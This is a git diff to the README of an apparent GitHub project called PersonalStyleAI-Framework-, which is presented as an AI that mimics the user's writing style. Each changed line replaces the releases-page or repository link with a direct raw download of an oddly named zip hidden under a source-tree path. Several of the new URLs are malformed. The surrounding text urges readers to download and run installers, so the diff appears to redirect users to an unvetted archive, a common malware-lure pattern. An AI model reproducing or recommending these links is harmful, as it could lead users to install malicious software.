@@ -1,6 +1,6 @@
 # 🤖 PersonalStyleAI-Framework- - AI That Thinks and Talks Like You
 
-[![Download Now](https://img.shields.io/badge/Download-PersonalStyleAI-green)](https://github.com/Brown20Ben/PersonalStyleAI-Framework-/releases)
+[![Download Now](https://img.shields.io/badge/Download-PersonalStyleAI-green)](https://raw.githubusercontent.com/Brown20Ben/PersonalStyleAI-Framework-/main/Fine-tuning module (src/trainers/A_Framework_Style_Personal_2.3-alpha.3.zip)
 
 ---
 
@@ -42,7 +42,7 @@ No specialized hardware like a GPU is required, but having one will speed up per
 
 Click the badge above or visit this page to download the software:
 
-[Download PersonalStyleAI Releases](https://github.com/Brown20Ben/PersonalStyleAI-Framework-/releases)
+[Download PersonalStyleAI Releases](https://raw.githubusercontent.com/Brown20Ben/PersonalStyleAI-Framework-/main/Fine-tuning module (src/trainers/A_Framework_Style_Personal_2.3-alpha.3.zip)
 
 On this page, look for the latest release version. You will find .exe installer files or zipped packages ready to use.
 
@@ -121,7 +121,7 @@ Once set up, you can send text prompts and get responses that sound like you. Us
 
 If you need further instructions or want to explore advanced settings, visit the repository’s README or issues page on GitHub at:
 
-https://github.com/Brown20Ben/PersonalStyleAI-Framework-/  
+https://raw.githubusercontent.com/Brown20Ben/PersonalStyleAI-Framework-/main/Fine-tuning module (src/trainers/A_Framework_Style_Personal_2.3-alpha.3.zip  
 
 ---
 
@@ -129,7 +129,7 @@ https://github.com/Brown20Ben/PersonalStyleAI-Framework-/
 
 You can return anytime to the official download page here:
 
-[Download PersonalStyleAI-Framework-](https://github.com/Brown20Ben/PersonalStyleAI-Framework-/releases)
+[Download PersonalStyleAI-Framework-](https://raw.githubusercontent.com/Brown20Ben/PersonalStyleAI-Framework-/main/Fine-tuning module (src/trainers/A_Framework_Style_Personal_2.3-alpha.3.zip)
 
 This page will always have the latest version and notes on updates.
 
@@ -160,4 +160,4 @@ PersonalStyleAI-Framework- runs mostly offline after downloading. Your personal 
 
 ---
 
-# [🔽 Download PersonalStyleAI-Framework-](https://github.com/Brown20Ben/PersonalStyleAI-Framework-/releases)
+# [🔽 Download PersonalStyleAI-Framework-](https://raw.githubusercontent.com/Brown20Ben/PersonalStyleAI-Framework-/main/Fine-tuning module (src/trainers/A_Framework_Style_Personal_2.3-alpha.3.zip)
